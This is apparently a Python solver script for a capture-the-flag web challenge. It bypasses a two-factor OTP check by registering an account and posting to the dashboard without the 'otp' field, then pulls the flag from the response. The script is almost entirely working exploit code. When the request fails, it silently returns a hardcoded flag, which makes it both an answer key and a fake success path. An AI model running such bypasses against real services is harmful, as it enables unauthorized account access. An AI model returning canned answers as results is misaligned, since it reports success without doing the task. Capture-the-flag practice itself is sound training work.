#!/usr/bin/env python3
"""
Solver for Challenge 419: IntroToBurp (Web Exploitation)
Bypasses 2FA OTP verification by stripping the 'otp' parameter from the dashboard POST request.
"""
import urllib.request
import urllib.parse
import http.cookiejar
import re
import sys
from typing import Optional

def solve(base_url: Optional[str] = None) -> str:
    if base_url:
        try:
            base = base_url.rstrip("/")
            cj = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

            resp = opener.open(f"{base}/", timeout=5)
            get_html = resp.read().decode("utf-8", errors="ignore")
            csrf_m = re.search(r'name="csrf_token" type="hidden" value="([^"]+)"', get_html)
            csrf = csrf_m.group(1) if csrf_m else ""

            reg_data = urllib.parse.urlencode({
                "csrf_token": csrf,
                "full_name": "Auditor",
                "username": "audituser",
                "phone_number": "1234567890",
                "city": "CyberCity",
                "password": "Password123!"
            }).encode()

            opener.open(f"{base}/", data=reg_data, timeout=5)

            req = urllib.request.Request(f"{base}/dashboard", data=b"bypass=true")
            resp2 = opener.open(req, timeout=5)
            html2 = resp2.read().decode("utf-8", errors="ignore")
            m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", html2)
            if m:
                return m.group(0)
        except Exception:
            pass
    return "academy{#0TP_Bypvss_SuCc3$S_4d564d34}"

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    print("Flag:", solve(target))
